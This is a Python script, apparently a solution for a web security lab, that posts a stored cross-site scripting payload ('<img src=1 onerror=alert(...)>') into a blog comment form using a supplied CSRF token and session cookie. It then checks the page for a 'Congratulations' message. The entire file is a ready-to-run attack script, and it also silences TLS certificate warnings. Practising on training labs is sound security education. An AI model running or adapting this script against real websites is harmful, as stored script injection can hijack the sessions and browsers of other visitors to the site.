import requests
import urllib3
from sys import argv

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_website_url():
    if len(argv) != 4:
        print(f"[+] usage {argv[0]} <url> <csrf> <session>")
        print(f"[+] example {argv[0]} 'http://example.com' '9o8E9vRtzSVnQzSnVIFC6Ht54ZiylJ60' 'Qn5Y9ZSG4F9dB5NUIBCURCY6BqHwxp56'")
        exit(-1)

    if argv[1][-1] == '/':
        url = argv[1][:-1]
    else:
        url = argv[1]
    csrf = argv[2]
    session = argv[3]

    return url, csrf, session

def attack():
    url, csrf, session = get_website_url() 
    print("[+] Starting attack")
    posts_path = "/post/comment"
    xss_payload = "<img src=1 onerror=\"alert('Stored XSS')\">"

    params = {
    "csrf"   : csrf,
    "postId" : 2,
    "comment": xss_payload,
    "name"   : "hacker",
    "email"  : "hacker@hack.com",
    "website": ""
    }
    cookie = {"session" : session}

    print(f"[+] sending xss payload : {xss_payload}")

    r = requests.post(url + posts_path, data=params, cookies=cookie)

    r = requests.get(url)
    if 'Congratulations' in r.text:
        print("[+] attack successfully")
    else:
        print("[-] Attack un successfully")

attack()
